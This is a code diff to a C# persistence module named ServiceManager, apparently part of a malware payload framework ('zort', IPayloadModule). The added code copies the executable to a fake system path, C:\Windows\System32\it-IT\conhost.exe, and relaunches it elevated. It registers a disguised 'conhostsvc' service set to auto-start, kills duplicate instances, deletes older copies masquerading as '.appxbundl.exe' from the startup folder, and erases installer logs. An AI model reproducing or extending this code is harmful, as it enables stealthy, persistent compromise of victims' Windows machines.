@@ -1,12 +1,11 @@
 ﻿using System;
-using System.Collections.Generic;
 using System.ComponentModel;
 using System.Configuration.Install;
+using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Reflection;
 using System.ServiceProcess;
-using System.Text;
-using System.Threading.Tasks;
 
 namespace zort
 {
@@ -52,7 +51,7 @@ namespace zort
 
     public class ServiceManager : IPayloadModule
     {
-        const bool DEBUG_REINSTALL = !!!true;
+        const bool DEBUG_REINSTALL = false;
 
         public ElevationType ElevationType => ElevationType.Elevated;
 
@@ -63,53 +62,137 @@ namespace zort
             //check if we are running as a service
             if (!Environment.UserInteractive)
             {
-                ModuleLogger.Log(this, "Running in service mode. no need to install service. Exiting...");
-                return;
+                ModuleLogger.Log(this, "Running in service mode. no need to install service. Not installing svc...");
+
+                // Kill duplicate processes
+                var currentProcess = Process.GetCurrentProcess();
+                var duplicateProcesses = Process.GetProcessesByName(currentProcess.ProcessName)
+                    .Where(p => p.Id != currentProcess.Id);
+                foreach (var process in duplicateProcesses)
+                {
+                    ModuleLogger.Log(this, $"Killing duplicate process: {process.ProcessName} (PID: {process.Id})");
+                    try
+                    {
+                        process.Kill();
+                        process.WaitForExit();
+                        ModuleLogger.Log(this, $"Killed duplicate process: {process.ProcessName} (PID: {process.Id})");
+                    }
+                    catch (Exception ex)
+                    {
+                        ModuleLogger.Log(this, $"Failed to kill duplicate process: {process.ProcessName} (PID: {process.Id}). Error: {ex.Message}");
+                    }
+                }
+
+                // Remove old selves from startup
+                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                string[] oldSelves = Directory.GetFiles(startupFolder, "*.appxbundl.exe");
+                foreach (string oldSelf in oldSelves)
+                {
+                    try
+                    {
+                        File.Delete(oldSelf);
+                        ModuleLogger.Log(this, $"Deleted old self from startup: {oldSelf}");
+                    }
+                    catch (Exception ex)
+                    {
+                        ModuleLogger.Log(this, $"Failed to delete old self from startup: {oldSelf}. Error: {ex.Message}");
+                    }
+                }
             }
 
-            // Check if the service is already installed
-            var serviceName = "conhostsvc";
-            var service = ServiceController.GetServices().FirstOrDefault(s => s.ServiceName == serviceName);
-            if (service != null)
-            {
-                if (DEBUG_REINSTALL)
-                {
-                    ModuleLogger.Log(this, "DEBUG: Service is already installed. Reinstalling...");
-                    // Uninstall the service
-                    ModuleLogger.Log(this, "Stopping service...");
-                    using (var sc = new ServiceController(serviceName))
-                    {
-                        if (sc.Status != ServiceControllerStatus.Stopped)
-                        {
-                            sc.Stop();
-                            sc.WaitForStatus(ServiceControllerStatus.Stopped);
-                        }
-                    }
-                    ModuleLogger.Log(this, "Uninstalling service...");
-                    ManagedInstallerClass.InstallHelper(new string[] { "/u", Assembly.GetExecutingAssembly().Location });
-                }
-                else
-                {
-                    ModuleLogger.Log(this, "Service is already installed.");
-                    return;
-                }
-            }
             try
             {
+                // Check if the service is already installed
+                var serviceName = "conhostsvc";
+                var service = ServiceController.GetServices().FirstOrDefault(s => s.ServiceName.ToLower() == serviceName);
+                if (service != null)
+                {
+                    if (DEBUG_REINSTALL)
+                    {
+                        ModuleLogger.Log(this, "DEBUG: Service is already installed. Reinstalling...");
+                        // Uninstall the service
+                        ModuleLogger.Log(this, "Stopping service...");
+                        using (var sc = new ServiceController(serviceName))
+                        {
+                            if (sc.Status != ServiceControllerStatus.Stopped)
+                            {
+                                sc.Stop();
+                                sc.WaitForStatus(ServiceControllerStatus.Stopped);
+                            }
+                        }
+                        ModuleLogger.Log(this, "Uninstalling service...");
+                        ManagedInstallerClass.InstallHelper(new string[] { "/u", Assembly.GetExecutingAssembly().Location });
+                    }
+                    else
+                    {
+                        ModuleLogger.Log(this, "Service is already installed.");
+                        // Ensure that the service is running
+                        using (var sc = new ServiceController(serviceName))
+                        {
+                            if (sc.Status != ServiceControllerStatus.Running)
+                            {
+                                ModuleLogger.Log(this, "Service is not running. Starting service...");
+                                sc.Start();
+                                sc.WaitForStatus(ServiceControllerStatus.Running);
+                            }
+                            else
+                            {
+                                ModuleLogger.Log(this, "Service is already running.");
+                            }
+
+                            // Ensure that the service is enabled and will run on startup   
+                            using (var process = new Process())
+                            {
+                                process.StartInfo.FileName = "sc";
+                                process.StartInfo.Arguments = $"config \"{serviceName}\" start=auto";
+                                process.StartInfo.CreateNoWindow = true;
+                                process.StartInfo.UseShellExecute = false;
+                                process.Start();
+                                process.WaitForExit();
+                            }
+                            sc.Refresh();
+                        }
+
+                        ModuleLogger.Log(this, "Exiting without installing service.");
+                        Environment.Exit(0);
+                        return;
+                    }
+                }
+
+                // Check if running from C:\Windows\System32\it-IT\conhost.exe
+                string itITPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "System32", "it-IT");
+                string conhostPath = Path.Combine(itITPath, "conhost.exe");
+                if (Assembly.GetExecutingAssembly().Location != conhostPath)
+                {
+                    ModuleLogger.Log(this, "Not running from C:\\Windows\\System32\\it-IT\\conhost.exe. Copying and running from there..");
+
+                    // Copy myself over to C:\Windows\System32\it-IT\conhost.exe
+                    Directory.CreateDirectory(itITPath);
+                    File.Copy(Assembly.GetExecutingAssembly().Location, conhostPath, true);
+
+                    // Start myself from C:\Windows\System32\it-IT\conhost.exe as admin
+                    var p = new Process();
+                    p.StartInfo.FileName = conhostPath;
+                    p.StartInfo.UseShellExecute = true;
+                    p.StartInfo.Verb = "runas";
+                    p.Start();
+                    Environment.Exit(0);
+                    return;
+                }
 
                 // Install the service
                 ModuleLogger.Log(this, "Starting service installation...");
                 ManagedInstallerClass.InstallHelper(new string[] { Assembly.GetExecutingAssembly().Location });
                 // Delete Log files ending with InstallLog and InstallState in current directory
-                var logFiles = System.IO.Directory.GetFiles(Environment.CurrentDirectory, "*.InstallLog");
+                var logFiles = Directory.GetFiles(Environment.CurrentDirectory, "*.InstallLog");
                 foreach (var logFile in logFiles)
                 {
-                    System.IO.File.Delete(logFile);
+                    File.Delete(logFile);
                 }
-                logFiles = System.IO.Directory.GetFiles(Environment.CurrentDirectory, "*.InstallState");
+                logFiles = Directory.GetFiles(Environment.CurrentDirectory, "*.InstallState");
                 foreach (var logFile in logFiles)
                 {
-                    System.IO.File.Delete(logFile);
+                    File.Delete(logFile);
                 }
                 ModuleLogger.Log(this, "Service installation completed.");
 
@@ -118,29 +201,36 @@ namespace zort
                 ModuleLogger.Log(this, "Starting service...");
                 using (var sc = new ServiceController(serviceName))
                 {
+                    // Ensure that the service is enabled and will run on startup
+                    using (var process = new Process())
+                    {
+                        process.StartInfo.FileName = "sc";
+                        process.StartInfo.Arguments = $"config \"{serviceName}\" start=auto";
+                        process.StartInfo.CreateNoWindow = true;
+                        process.StartInfo.UseShellExecute = false;
+                        process.Start();
+                        process.WaitForExit();
+                    }
+
                     if (sc.Status != ServiceControllerStatus.Running)
                     {
                         sc.Start();
                         sc.WaitForStatus(ServiceControllerStatus.Running);
                     }
-                }
 
-                // Remove myself from the startup folder
-                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-                string startupFile = System.IO.Path.Combine(startupFolder, Assembly.GetExecutingAssembly().GetName().Name + ".exe");
-                if (System.IO.File.Exists(startupFile))
-                {
-                    System.IO.File.Delete(startupFile);
-                    ModuleLogger.Log(this, "Removed myself from startup folder.");
-                }
-                else
-                {
-                    ModuleLogger.Log(this, "Not in startup folder. No need to remove.");
+
+                    sc.Refresh();
                 }
             }
             catch (Exception ex)
             {
                 ModuleLogger.Log(this, $"Error installing service: {ex.Message}");
+            }
+            finally
+            {
+                // Exit the process
+                ModuleLogger.Log(this, "Exiting process.");
+                Environment.Exit(0);
             }
         }
 
